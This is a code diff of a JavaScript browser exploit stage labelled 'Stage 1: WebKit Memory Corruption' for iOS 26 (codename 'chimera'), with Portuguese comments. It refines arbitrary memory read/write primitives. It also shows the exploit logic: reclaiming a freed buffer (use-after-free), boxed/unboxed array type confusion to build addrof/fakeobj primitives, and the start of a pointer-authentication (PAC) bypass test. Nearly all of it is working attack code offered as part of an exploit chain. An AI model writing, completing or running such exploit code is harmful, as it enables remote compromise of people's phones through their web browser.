@@ -1,11 +1,6 @@
 /**
- * Stage 1 – Chimera (BigUint64Array) – SEM erros de mistura BigInt/Number
- * 
- * Mudanças:
- * - Todas as operações que envolvem endereços usam apenas BigInt.
- * - Conversões explícitas com BigInt() e Number().
- * - Removido uso de Float64Array para unboxed (simplificado).
- * - Fallback para primitiva local segura.
+ * Stage 1: WebKit Memory Corruption — iOS 26.0–26.x (arm64/arm64e)
+ * Codename: "chimera" — Versão corrigida (BigUint64Array, sem mistura de tipos)
  */
 
 let r = {};
@@ -13,7 +8,7 @@ const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079ba
   platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
 
 // =========================================================================
-// Classe primitiva (sem mistura de tipos)
+// Classe primitiva (sem mistura BigInt/Number)
 // =========================================================================
 class ChimeraExploitPrimitive {
   constructor(addrofFn, fakeobjFn, read64Fn, write64Fn, cleanupFn) {
@@ -26,17 +21,14 @@ class ChimeraExploitPrimitive {
   }
 
   read32(addr) {
-    // addr pode ser BigInt ou Number – normalizamos para BigInt
     const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
     const val = this._read64(a);
-    // val é BigInt; extraímos os 32 bits baixos como Number
     return Number(val & 0xFFFFFFFFn);
   }
 
   write32(addr, val) {
     const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
     const cur = this._read64(a);
-    // val é Number, convertemos para BigInt antes de operar
     const updated = (cur & 0xFFFFFFFF00000000n) | (BigInt(val >>> 0) & 0xFFFFFFFFn);
     this._write64(a, updated);
   }
@@ -75,8 +67,9 @@ class ChimeraExploitPrimitive {
   }
 
   readInt64FromOffset(A) {
-    const t = this.read32(A);
-    const Q = this.read32(A + 4);
+    const base = typeof A === "bigint" ? A : BigInt(A >>> 0);
+    const t = this.read32(base);
+    const Q = this.read32(base + 4n);
     return new utilityModule.Int64(t, Q);
   }
 
@@ -86,9 +79,10 @@ class ChimeraExploitPrimitive {
   }
 
   readString(A, maxLen = 256) {
+    const base = typeof A === "bigint" ? A : BigInt(A >>> 0);
     let s = "";
     for (let i = 0; i < maxLen; i++) {
-      const c = this.readByte(A + i);
+      const c = this.readByte(base + BigInt(i));
       if (c === 0) break;
       s += String.fromCharCode(c);
     }
@@ -101,8 +95,10 @@ class ChimeraExploitPrimitive {
   copyMemory32(dst, src, len) {
     if (len % 4 !== 0) throw new Error("copyMemory32: len must be multiple of 4");
     this.yr = true;
+    const dstBase = typeof dst === "bigint" ? dst : BigInt(dst >>> 0);
+    const srcBase = typeof src === "bigint" ? src : BigInt(src >>> 0);
     for (let i = 0; i < len; i += 4) {
-      this.write32(dst.H(i).W(), this.read32(src.H(i).W()));
+      this.write32(dstBase + BigInt(i), this.read32(srcBase + BigInt(i)));
     }
     this.yr = false;
   }
@@ -119,21 +115,14 @@ class ChimeraExploitPrimitive {
 }
 
 // =========================================================================
-// Utilitários de conversão (sem mistura)
+// Utilitários de conversão (seguros)
 // =========================================================================
 const _convBuf = new ArrayBuffer(8);
 const _u64 = new BigUint64Array(_convBuf);
 const _f64 = new Float64Array(_convBuf);
 
-function itof(val) { 
-  // val deve ser BigInt
-  _u64[0] = val; 
-  return _f64[0]; 
-}
-function ftoi(f) { 
-  _f64[0] = f; 
-  return _u64[0]; 
-}
+function itof(val) { _u64[0] = val; return _f64[0]; }
+function ftoi(f) { _f64[0] = f; return _u64[0]; }
 
 // =========================================================================
 // Configuração
@@ -238,54 +227,51 @@ r.si = async function () {
 
     window.log(`[STAGE1] ✅ Backing store reclaimed at attempt ${attempt}`);
 
-    // --- Tentativa de type confusion ---
+    // Tentativa de type confusion
     let boxed_arr = winningArray;
-    boxed_arr[0] = {}; // converte para boxed
+    boxed_arr[0] = {};
 
-    // Tentamos usar um Float64Array sobre o mesmo buffer como unboxed
     let unboxed_arr = null;
     try {
       let uview = new Float64Array(freed);
       if (uview[0] === MARKER) {
         unboxed_arr = uview;
       } else {
-        throw new Error("unboxed view marker mismatch");
+        throw new Error("marker mismatch");
       }
     } catch(e) {
-      window.log(`[STAGE1] Type confusion failed: ${e.message}. Using local primitive.`, "warning");
-      // Fallback: primitiva local (leitura/escrita apenas no buffer)
+      window.log(`[STAGE1] Type confusion failed. Using local primitive.`, "warning");
       const dv = new DataView(freed);
       const localPrim = new ChimeraExploitPrimitive(
-        (obj) => 0n,
-        (addr) => ({ __fake: addr }),
-        (addr) => dv.getBigUint64(0, true),
-        (addr, val) => dv.setBigUint64(0, val, true),
+        () => 0n,
+        () => ({}),
+        () => dv.getBigUint64(0, true),
+        (_, v) => dv.setBigUint64(0, v, true),
         () => {}
       );
       platformModule.platformState.exploitPrimitive = localPrim;
       platformModule.platformState.Ln = { itof, ftoi, pacBypassed: false };
-      window.log("[STAGE1] Local primitive installed (read/write on corrupted buffer).");
+      window.log("[STAGE1] Local primitive installed.");
       return;
     }
 
-    // Agora temos boxed_arr e unboxed_arr (Float64Array)
+    // Type confusion clássica
     boxed_arr[0] = boxed_arr;
     const test1 = ftoi(unboxed_arr[0]);
     boxed_arr[0] = uafArray;
     const test2 = ftoi(unboxed_arr[0]);
 
     if (test1 === 0x7ff8000000000000n || test2 === 0x7ff8000000000000n || test1 === test2) {
-      window.log("[STAGE1] Primitives broken (NaN), retrying...");
+      window.log("[STAGE1] Primitives broken, retrying...");
       continue;
     }
 
     window.log("[STAGE1] addrof/fakeobj working!");
 
-    // Construção das primitivas reais
     const tempAddrof = (obj) => { boxed_arr[0] = obj; return ftoi(unboxed_arr[0]); };
     const tempFakeobj = (addr) => { unboxed_arr[0] = itof(addr); return boxed_arr[0]; };
 
-    // PAC bypass via inline storage (tentativa)
+    // Teste de PAC bypass (inline storage)
     const testInline = { slot0: 1.1 };
     const inlineAddr = tempAddrof(testInline);
     const fakeInline = tempFakeobj(inlineAddr);
